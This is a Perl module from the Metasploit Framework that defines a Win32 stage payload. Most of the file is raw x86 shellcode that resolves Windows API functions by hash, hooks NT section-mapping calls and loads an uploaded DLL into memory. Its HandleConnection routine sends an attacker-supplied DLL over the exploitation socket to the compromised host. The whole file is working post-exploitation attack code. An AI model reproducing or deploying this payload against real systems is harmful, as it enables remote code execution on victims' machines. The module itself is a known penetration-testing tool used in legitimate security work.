package Msf::PayloadComponent::Win32InjectLibStage;
use strict;
use base 'Msf::PayloadComponent::Win32StagePayload';

my $info = {
  'Win32StagePayload' =>
    {
      Offsets => { EXITFUNC => [193, 'V'] },
      Payload => 
        "\x55\x8b\xec\x81\xec\xb0\x00\x00\x00\x53\x56\x57\xeb\x02\xeb\x05".
        "\xe8\xf9\xff\xff\xff\x5b\x83\xeb\x15\x89\x9d\x70\xff\xff\xff\x89".
        "\xbd\x5c\xff\xff\xff\xeb\x70\x56\x33\xc0\x64\x8b\x40\x30\x85\xc0".
        "\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40\x08\xeb\x09\x8b\x40".
        "\x34\x8d\x40\x7c\x8b\x40\x3c\x5e\xc3\x60\x8b\x6c\x24\x24\x8b\x45".
        "\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20\x03\xdd\xe3".
        "\x34\x49\x8b\x34\x8b\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74".
        "\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a".
        "\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03".
        "\xc5\x89\x44\x24\x1c\x61\xc3\xe8\x8b\xff\xff\xff\x8b\xd8\x68\x8e".
        "\x4e\x0e\xec\x53\xe8\xa0\xff\xff\xff\x83\xc4\x08\x89\x45\xc4\x68".
        "\xaa\xfc\x0d\x7c\x53\xe8\x8f\xff\xff\xff\x83\xc4\x08\x89\x45\xc8".
        "\x68\x7e\xd8\xe2\x73\x53\xe8\x7e\xff\xff\xff\x83\xc4\x08\x89\x45".
        "\xcc\x68\x54\xca\xaf\x91\x53\xe8\x6d\xff\xff\xff\x83\xc4\x08\x89".
        "\x45\xd0\x68\xaa\xc8\xc8\xa3\x53\xe8\x5c\xff\xff\xff\x83\xc4\x08".
        "\x89\x45\xd4\x68\x1b\xc6\x46\x79\x53\xe8\x4b\xff\xff\xff\x83\xc4".
        "\x08\x89\x45\xd8\x68\x80\x09\x12\x53\x53\xe8\x3a\xff\xff\xff\x83".
        "\xc4\x08\x89\x45\xdc\x68\xa1\x6a\x3d\xd8\x53\xe8\x29\xff\xff\xff".
        "\x83\xc4\x08\x89\x45\xe0\x33\xc0\xb0\x6c\x50\x68\x6e\x74\x64\x6c".
        "\x54\xff\x55\xc4\x8b\xd8\x68\x95\xdd\xb5\x92\x53\xe8\x08\xff\xff".
        "\xff\x83\xc4\x08\x89\x45\xb0\x68\x90\x78\x4a\x49\x53\xe8\xf7\xfe".
        "\xff\xff\x83\xc4\x08\x89\x45\xb4\x68\xb8\x74\x29\x85\x53\xe8\xe6".
        "\xfe\xff\xff\x83\xc4\x08\x89\x45\xb8\x68\xcb\x9b\xb2\x5b\x53\xe8".
        "\xd5\xfe\xff\xff\x83\xc4\x08\x89\x45\xbc\x68\x94\x9b\x15\xd5\x53".
        "\xe8\xc4\xfe\xff\xff\x83\xc4\x08\x89\x45\xc0\x68\xb6\xbd\x8a\x86".
        "\x53\xe8\xb3\xfe\xff\xff\x83\xc4\x08\x89\x45\xf8\xc6\x85\x50\xff".
        "\xff\xff\x77\xc6\x85\x51\xff\xff\xff\x73\xc6\x85\x52\xff\xff\xff".
        "\x32\xc6\x85\x53\xff\xff\xff\x5f\xc6\x85\x54\xff\xff\xff\x33\xc6".
        "\x85\x55\xff\xff\xff\x32\xc6\x85\x56\xff\xff\xff\x00\x8d\x85\x50".
        "\xff\xff\xff\x50\xff\x55\xc4\x8b\xd0\x68\xb6\x19\x18\xe7\x52\xe8".
        "\x65\xfe\xff\xff\x83\xc4\x08\x89\x45\xfc\x8d\x8d\x5c\xff\xff\xff".
        "\x51\xe8\xd6\x07\x00\x00\x83\xc4\x04\x5f\x5e\x5b\x8b\xe5\x5d\xc3".
        "\xff\xff\xff\xff\x55\x8b\xec\xe8\x00\x00\x00\x00\x59\x83\xe9\x08".
        "\xb8\xc0\x16\x40\x00\x2d\xbc\x16\x40\x00\x2b\xc8\x8b\x01\x5d\xc3".
        "\x55\x8b\xec\x81\xec\x1c\x01\x00\x00\x57\xc6\x85\xfc\xfe\xff\xff".
        "\x00\xb9\x3f\x00\x00\x00\x33\xc0\x8d\xbd\xfd\xfe\xff\xff\xf3\xab".
        "\x66\xab\xaa\x66\xc7\x85\xf0\xfe\xff\xff\x00\x01\x66\x8b\x85\xf0".
        "\xfe\xff\xff\x66\x89\x85\xe4\xfe\xff\xff\x66\x8b\x8d\xe4\xfe\xff".
        "\xff\x66\x89\x8d\xf4\xfe\xff\xff\x66\x8b\x95\xf0\xfe\xff\xff\x66".
        "\x89\x95\xf6\xfe\xff\xff\x8d\x85\xfc\xfe\xff\xff\x89\x85\xf8\xfe".
        "\xff\xff\xe8\x7d\xff\xff\xff\x89\x45\xfc\x6a\x00\x8b\x4d\x10\x8b".
        "\x51\x08\x52\x8d\x85\xf4\xfe\xff\xff\x50\x8b\x4d\xfc\xff\x91\x9c".
        "\x00\x00\x00\xc7\x85\xec\xfe\xff\xff\x00\x00\x00\x00\xeb\x0f\x8b".
        "\x95\xec\xfe\xff\xff\x83\xc2\x01\x89\x95\xec\xfe\xff\xff\x8b\x85".
        "\xec\xfe\xff\xff\x0f\xbe\x8c\x05\xfc\xfe\xff\xff\x85\xc9\x74\x74".
        "\xc7\x85\xe8\xfe\xff\xff\x00\x00\x00\x00\xeb\x0f\x8b\x95\xe8\xfe".
        "\xff\xff\x83\xc2\x01\x89\x95\xe8\xfe\xff\xff\x8b\x45\xfc\x8b\x8d".
        "\xe8\xfe\xff\xff\x3b\x48\x10\x7d\x29\x8b\x95\xec\xfe\xff\xff\x03".
        "\x95\xe8\xfe\xff\xff\x0f\xbe\x84\x15\xfc\xfe\xff\xff\x8b\x4d\xfc".
        "\x03\x8d\xe8\xfe\xff\xff\x0f\xbe\x51\x04\x3b\xc2\x74\x02\xeb\x02".
        "\xeb\xba\x8b\x45\xfc\x8b\x8d\xe8\xfe\xff\xff\x3b\x48\x10\x75\x0f".
        "\x8b\x55\x08\x8b\x45\xfc\x8b\x48\x1c\x89\x0a\x33\xc0\xeb\x1a\xe9".
        "\x6b\xff\xff\xff\x8b\x55\x10\x52\x8b\x45\x0c\x50\x8b\x4d\x08\x51".
        "\x8b\x55\xfc\xff\x92\x88\x00\x00\x00\x5f\x8b\xe5\x5d\xc2\x0c\x00".
        "\x55\x8b\xec\x81\xec\x20\x01\x00\x00\x57\xc6\x85\xfc\xfe\xff\xff".
        "\x00\xb9\x3f\x00\x00\x00\x33\xc0\x8d\xbd\xfd\xfe\xff\xff\xf3\xab".
        "\x66\xab\xaa\xc7\x85\xec\xfe\xff\xff\x04\x00\x00\x00\x66\xc7\x85".
        "\xf0\xfe\xff\xff\x00\x01\x66\x8b\x85\xf0\xfe\xff\xff\x66\x89\x85".
        "\xe0\xfe\xff\xff\x66\x8b\x8d\xe0\xfe\xff\xff\x66\x89\x8d\xf4\xfe".
        "\xff\xff\x66\x8b\x95\xf0\xfe\xff\xff\x66\x89\x95\xf6\xfe\xff\xff".
        "\x8d\x85\xfc\xfe\xff\xff\x89\x85\xf8\xfe\xff\xff\xe8\x33\xfe\xff".
        "\xff\x89\x45\xfc\x6a\x00\x8b\x4d\x08\x8b\x51\x08\x52\x8d\x85\xf4".
        "\xfe\xff\xff\x50\x8b\x4d\xfc\xff\x91\x9c\x00\x00\x00\xc7\x85\xe8".
        "\xfe\xff\xff\x00\x00\x00\x00\xeb\x0f\x8b\x95\xe8\xfe\xff\xff\x83".
        "\xc2\x01\x89\x95\xe8\xfe\xff\xff\x8b\x85\xe8\xfe\xff\xff\x0f\xbe".
        "\x8c\x05\xfc\xfe\xff\xff\x85\xc9\x0f\x84\xc2\x00\x00\x00\xc7\x85".
        "\xe4\xfe\xff\xff\x00\x00\x00\x00\xeb\x0f\x8b\x95\xe4\xfe\xff\xff".
        "\x83\xc2\x01\x89\x95\xe4\xfe\xff\xff\x8b\x45\xfc\x8b\x8d\xe4\xfe".
        "\xff\xff\x3b\x48\x10\x7d\x29\x8b\x95\xe8\xfe\xff\xff\x03\x95\xe4".
        "\xfe\xff\xff\x0f\xbe\x84\x15\xfc\xfe\xff\xff\x8b\x4d\xfc\x03\x8d".
        "\xe4\xfe\xff\xff\x0f\xbe\x51\x04\x3b\xc2\x74\x02\xeb\x02\xeb\xba".
        "\x8b\x45\xfc\x8b\x8d\xe4\xfe\xff\xff\x3b\x48\x10\x75\x5d\x8b\x55".
        "\x0c\xc7\x02\xe0\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x04\xfa\x22\xc4".
        "\x01\x8b\x4d\x0c\xc7\x41\x08\xe0\x5c\x27\x8e\x8b\x55\x0c\xc7\x42".
        "\x0c\xfa\x22\xc4\x01\x8b\x45\x0c\xc7\x40\x10\xe0\x5c\x27\x7e\x8b".
        "\x4d\x0c\xc7\x41\x14\xfa\x22\xc4\x01\x8b\x55\x0c\xc7\x42\x18\xe0".
        "\x5c\x27\x7e\x8b\x45\x0c\xc7\x40\x1c\xfa\x22\xc4\x01\x8b\x4d\x0c".
        "\xc7\x41\x20\x80\x00\x00\x00\x33\xc0\xeb\x16\xe9\x19\xff\xff\xff".
        "\x8b\x55\x0c\x52\x8b\x45\x08\x50\x8b\x4d\xfc\xff\x91\x8c\x00\x00".
        "\x00\x5f\x8b\xe5\x5d\xc2\x08\x00\x55\x8b\xec\x81\xec\x1c\x01\x00".
        "\x00\x57\xc6\x85\xfc\xfe\xff\xff\x00\xb9\x3f\x00\x00\x00\x33\xc0".
        "\x8d\xbd\xfd\xfe\xff\xff\xf3\xab\x66\xab\xaa\x66\xc7\x85\xf0\xfe".
        "\xff\xff\x00\x01\x66\x8b\x85\xf0\xfe\xff\xff\x66\x89\x85\xe4\xfe".
        "\xff\xff\x66\x8b\x8d\xe4\xfe\xff\xff\x66\x89\x8d\xf4\xfe\xff\xff".
        "\x66\x8b\x95\xf0\xfe\xff\xff\x66\x89\x95\xf6\xfe\xff\xff\x8d\x85".
        "\xfc\xfe\xff\xff\x89\x85\xf8\xfe\xff\xff\xe8\xa5\xfc\xff\xff\x89".
        "\x45\xfc\x6a\x00\x8b\x4d\x10\x8b\x51\x08\x52\x8d\x85\xf4\xfe\xff".
        "\xff\x50\x8b\x4d\xfc\xff\x91\x9c\x00\x00\x00\xc7\x85\xec\xfe\xff".
        "\xff\x00\x00\x00\x00\xeb\x0f\x8b\x95\xec\xfe\xff\xff\x83\xc2\x01".
        "\x89\x95\xec\xfe\xff\xff\x8b\x85\xec\xfe\xff\xff\x0f\xbe\x8c\x05".
        "\xfc\xfe\xff\xff\x85\xc9\x74\x72\xc7\x85\xe8\xfe\xff\xff\x00\x00".
        "\x00\x00\xeb\x0f\x8b\x95\xe8\xfe\xff\xff\x83\xc2\x01\x89\x95\xe8".
        "\xfe\xff\xff\x8b\x45\xfc\x8b\x8d\xe8\xfe\xff\xff\x3b\x48\x10\x7d".
        "\x29\x8b\x95\xec\xfe\xff\xff\x03\x95\xe8\xfe\xff\xff\x0f\xbe\x84".
        "\x15\xfc\xfe\xff\xff\x8b\x4d\xfc\x03\x8d\xe8\xfe\xff\xff\x0f\xbe".
        "\x51\x04\x3b\xc2\x74\x02\xeb\x02\xeb\xba\x8b\x45\xfc\x8b\x8d\xe8".
        "\xfe\xff\xff\x3b\x48\x10\x75\x0d\x8b\x55\x08\x8b\x45\xfc\x8b\x48".
        "\x1c\x89\x0a\xeb\x26\xe9\x6d\xff\xff\xff\x8b\x55\x1c\x52\x8b\x45".
        "\x18\x50\x8b\x4d\x14\x51\x8b\x55\x10\x52\x8b\x45\x0c\x50\x8b\x4d".
        "\x08\x51\x8b\x55\xfc\xff\x92\x90\x00\x00\x00\x5f\x8b\xe5\x5d\xc2".
        "\x18\x00\x55\x8b\xec\x51\xe8\xb9\xfb\xff\xff\x89\x45\xfc\x8b\x45".
        "\xfc\x8b\x4d\x20\x3b\x48\x1c\x75\x0f\x8b\x55\x08\x8b\x45\xfc\x8b".
        "\x48\x1c\x89\x0a\x33\xc0\xeb\x25\x8b\x55\x20\x52\x8b\x45\x1c\x50".
        "\x8b\x4d\x18\x51\x8b\x55\x14\x52\x8b\x45\x10\x50\x8b\x4d\x0c\x51".
        "\x8b\x55\x08\x52\x8b\x45\xfc\xff\x90\x94\x00\x00\x00\x8b\xe5\x5d".
        "\xc2\x1c\x00\x55\x8b\xec\x51\xe8\x68\xfb\xff\xff\x89\x45\xfc\x8b".
        "\x45\xfc\x8b\x4d\x08\x3b\x48\x1c\x75\x12\x8b\x55\x10\x8b\x45\xfc".
        "\x8b\x48\x1c\x89\x0a\xb8\x03\x00\x00\x40\xeb\x31\x8b\x55\x2c\x52".
        "\x8b\x45\x28\x50\x8b\x4d\x24\x51\x8b\x55\x20\x52\x8b\x45\x1c\x50".
        "\x8b\x4d\x18\x51\x8b\x55\x14\x52\x8b\x45\x10\x50\x8b\x4d\x0c\x51".
        "\x8b\x55\x08\x52\x8b\x45\xfc\xff\x90\x98\x00\x00\x00\x8b\xe5\x5d".
        "\xc2\x28\x00\x55\x8b\xec\x83\xec\x28\xc7\x45\xd8\x05\x00\x00\x00".
        "\x8d\x45\xe0\x50\x8b\x4d\xd8\x51\x8b\x55\x0c\x52\x8b\x45\x10\x50".
        "\x6a\xff\x8b\x4d\x08\xff\x91\x84\x00\x00\x00\x8b\x55\x10\x03\x55".
        "\xd8\xc6\x02\xe9\x8b\x45\x10\x83\xc0\x05\x8b\x4d\x0c\x2b\xc8\x8b".
        "\x55\x10\x03\x55\xd8\x89\x4a\x01\x6a\x1c\x8d\x45\xe4\x50\x8b\x4d".
        "\x0c\x51\x8b\x55\x08\xff\x52\x78\x8d\x45\xf8\x50\x6a\x40\x8b\x4d".
        "\xf0\x51\x8b\x55\xe4\x52\x8b\x45\x08\xff\x50\x7c\x8b\x4d\x0c\xc6".
        "\x01\xe9\x8b\x55\x0c\x83\xc2\x05\x8b\x45\x14\x2b\xc2\x8b\x4d\x0c".
        "\x89\x41\x01\x8d\x55\xdc\x52\x8b\x45\xf8\x50\x8b\x4d\xf0\x51\x8b".
        "\x55\xe4\x52\x8b\x45\x08\xff\x50\x7c\x8b\x4d\xf0\x51\x8b\x55\xe4".
        "\x52\x6a\xff\x8b\x45\x08\xff\x90\x80\x00\x00\x00\x8b\xe5\x5d\xc3".
        "\x55\x8b\xec\xb8\x4f\x1b\x40\x00\x2d\xbc\x14\x40\x00\x8b\x4d\x08".
        "\x03\x41\x14\x50\x8b\x55\x08\x83\xc2\x48\x52\x8b\x45\x08\x8b\x48".
        "\x64\x51\x8b\x55\x08\x52\xe8\x28\xff\xff\xff\x83\xc4\x10\x8b\x45".
        "\x08\x83\xc0\x48\x8b\x4d\x08\x89\x81\x98\x00\x00\x00\xba\x1c\x18".
        "\x40\x00\x81\xea\xbc\x14\x40\x00\x8b\x45\x08\x03\x50\x14\x52\x8b".
        "\x4d\x08\x83\xc1\x2a\x51\x8b\x55\x08\x8b\x42\x58\x50\x8b\x4d\x08".
        "\x51\xe8\xed\xfe\xff\xff\x83\xc4\x10\x8b\x55\x08\x83\xc2\x2a\x8b".
        "\x45\x08\x89\x90\x8c\x00\x00\x00\xb9\xb4\x19\x40\x00\x81\xe9\xbc".
        "\x14\x40\x00\x8b\x55\x08\x03\x4a\x14\x51\x8b\x45\x08\x83\xc0\x34".
        "\x50\x8b\x4d\x08\x8b\x51\x5c\x52\x8b\x45\x08\x50\xe8\xb2\xfe\xff".
        "\xff\x83\xc4\x10\x8b\x4d\x08\x83\xc1\x34\x8b\x55\x08\x89\x8a\x90".
        "\x00\x00\x00\xb8\xfe\x1a\x40\x00\x2d\xbc\x14\x40\x00\x8b\x4d\x08".
        "\x03\x41\x14\x50\x8b\x55\x08\x83\xc2\x3e\x52\x8b\x45\x08\x8b\x48".
        "\x60\x51\x8b\x55\x08\x52\xe8\x78\xfe\xff\xff\x83\xc4\x10\x8b\x45".
        "\x08\x83\xc0\x3e\x8b\x4d\x08\x89\x81\x94\x00\x00\x00\xba\xdc\x16".
        "\x40\x00\x81\xea\xbc\x14\x40\x00\x8b\x45\x08\x03\x50\x14\x52\x8b".
        "\x4d\x08\x83\xc1\x20\x51\x8b\x55\x08\x8b\x42\x54\x50\x8b\x4d\x08".
        "\x51\xe8\x3d\xfe\xff\xff\x83\xc4\x10\x8b\x55\x08\x83\xc2\x20\x8b".
        "\x45\x08\x89\x90\x88\x00\x00\x00\x5d\xc3\x55\x8b\xec\x83\xec\x10".
        "\x8b\x45\x08\x8b\x48\x18\x89\x4d\xf4\x8b\x55\x08\x8b\x42\x18\x8b".
        "\x4d\xf4\x03\x41\x3c\x89\x45\xf8\x6a\x40\x68\x00\x30\x00\x00\x8b".
        "\x55\xf8\x8b\x42\x50\x50\x8b\x4d\xf8\x8b\x51\x34\x52\x8b\x45\x08".
        "\xff\x50\x74\x8b\x4d\x08\x89\x41\x1c\x8b\x55\x08\x83\x7a\x1c\x00".
        "\x75\x1c\x6a\x40\x68\x00\x30\x00\x00\x8b\x45\xf8\x8b\x48\x50\x51".
        "\x6a\x00\x8b\x55\x08\xff\x52\x74\x8b\x4d\x08\x89\x41\x1c\x6a\x00".
        "\x8b\x55\xf8\x8b\x42\x54\x50\x8b\x4d\x08\x8b\x51\x18\x52\x8b\x45".
        "\x08\x8b\x48\x1c\x51\x6a\xff\x8b\x55\x08\xff\x92\x84\x00\x00\x00".
        "\x8b\x45\xf8\x33\xc9\x66\x8b\x48\x14\x8b\x55\xf8\x8d\x44\x0a\x18".
        "\x89\x45\xfc\xc7\x45\xf0\x00\x00\x00\x00\xeb\x09\x8b\x4d\xf0\x83".
        "\xc1\x01\x89\x4d\xf0\x8b\x55\xf8\x33\xc0\x66\x8b\x42\x06\x39\x45".
        "\xf0\x7d\x45\x6a\x00\x8b\x4d\xf0\x6b\xc9\x28\x8b\x55\xfc\x8b\x44".
        "\x0a\x10\x50\x8b\x4d\xf0\x6b\xc9\x28\x8b\x55\x08\x8b\x42\x18\x8b".
        "\x55\xfc\x03\x44\x0a\x14\x50\x8b\x45\xf0\x6b\xc0\x28\x8b\x4d\x08".
        "\x8b\x51\x1c\x8b\x4d\xfc\x03\x54\x01\x0c\x52\x6a\xff\x8b\x55\x08".
        "\xff\x92\x84\x00\x00\x00\xeb\xa4\x8b\xe5\x5d\xc3\x55\x8b\xec\x83".
        "\xec\x24\xc7\x45\xe0\x00\x00\x00\x00\xc7\x45\xf4\x00\x00\x00\x00".
        "\x8b\x45\x08\xc6\x40\x04\x68\x8b\x4d\x08\xc6\x41\x05\x78\x8b\x55".
        "\x08\xc6\x42\x06\x72\x8b\x45\x08\xc6\x40\x07\x33\x8b\x4d\x08\xc6".
        "\x41\x08\x32\x8b\x55\x08\xc6\x42\x09\x2e\x8b\x45\x08\xc6\x40\x0a".
        "\x64\x8b\x4d\x08\xc6\x41\x0b\x6c\x8b\x55\x08\xc6\x42\x0c\x6c\x8b".
        "\x45\x08\xc6\x40\x0d\x00\x8b\x4d\x08\xc7\x41\x10\x0a\x00\x00\x00".
        "\xc6\x45\xe8\x49\xc6\x45\xe9\x6e\xc6\x45\xea\x69\xc6\x45\xeb\x74".
        "\xc6\x45\xec\x00\x6a\x00\x6a\x04\x8d\x55\xfc\x52\x8b\x45\x08\x8b".
        "\x08\x51\x8b\x55\x08\xff\x92\xa0\x00\x00\x00\x89\x45\xe0\x83\x7d".
        "\xe0\x00\x7f\x08\x6a\x01\x8b\x45\x08\xff\x50\x70\x6a\x04\x68\x00".
        "\x10\x00\x00\x8b\x4d\xfc\x51\x6a\x00\x8b\x55\x08\xff\x52\x74\x8b".
        "\x4d\x08\x89\x41\x18\x8b\x55\x08\x83\x7a\x18\x00\x75\x08\x6a\x01".
        "\x8b\x45\x08\xff\x50\x70\x8b\x4d\xfc\x89\x4d\xdc\xeb\x12\x8b\x55".
        "\xdc\x2b\x55\xe0\x89\x55\xdc\x8b\x45\xf4\x03\x45\xe0\x89\x45\xf4".
        "\x83\x7d\xdc\x00\x7e\x2c\x6a\x00\x8b\x4d\xdc\x51\x8b\x55\x08\x8b".
        "\x42\x18\x03\x45\xf4\x50\x8b\x4d\x08\x8b\x11\x52\x8b\x45\x08\xff".
        "\x90\xa0\x00\x00\x00\x89\x45\xe0\x83\x7d\xe0\x00\x7d\x02\xeb\x02".
        "\xeb\xbc\x8b\x4d\x08\x51\xe8\xdf\xfd\xff\xff\x83\xc4\x04\xba\xbc".
        "\x16\x40\x00\x81\xea\xbc\x14\x40\x00\x8b\x45\x08\x8b\x48\x14\x8b".
        "\x45\x08\x89\x04\x0a\x8b\x4d\x08\x51\xe8\x92\xfc\xff\xff\x83\xc4".
        "\x04\x8b\x55\x08\x83\xc2\x04\x52\x8b\x45\x08\xff\x50\x68\x89\x45".
        "\xe4\x8d\x4d\xe8\x51\x8b\x55\xe4\x52\x8b\x45\x08\xff\x50\x6c\x89".
        "\x45\xf8\x8b\x4d\x08\x8b\x11\x52\xff\x55\xf8\x83\xc4\x04\x6a\x00".
        "\x8b\x45\x08\xff\x50\x70\x33\xc0\x8b\xe5\x5d\xc3", 
  }
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub HandleConnection {
  my $self = shift;
  my $sock = $self->SocketOut;
  my $path = $self->_InjectDLL;

  $self->SUPER::HandleConnection;
  
  if(!open(INFILE, '<' . $path)) {
    $self->PrintLine('[*] Could not open path to dll.');
    $self->KillChild;
    return;
  }

  local $/;
  my $upload = <INFILE>;
  close(INFILE);

  $self->PrintLine('[*] Sleeping before sending dll.');
  sleep(2);
  
  if (! $sock->connected) {
    $self->PrintLine('[*] Socket closed before dll was uploaded');
    $self->KillChild;
    return;  
  }
  
  $self->PrintLine('[*] Uploading dll to memory (' . length($upload) . '), Please wait...');
  $sock->blocking(1);
  $sock->send(pack('V', length($upload)));
  $sock->send($upload);
}
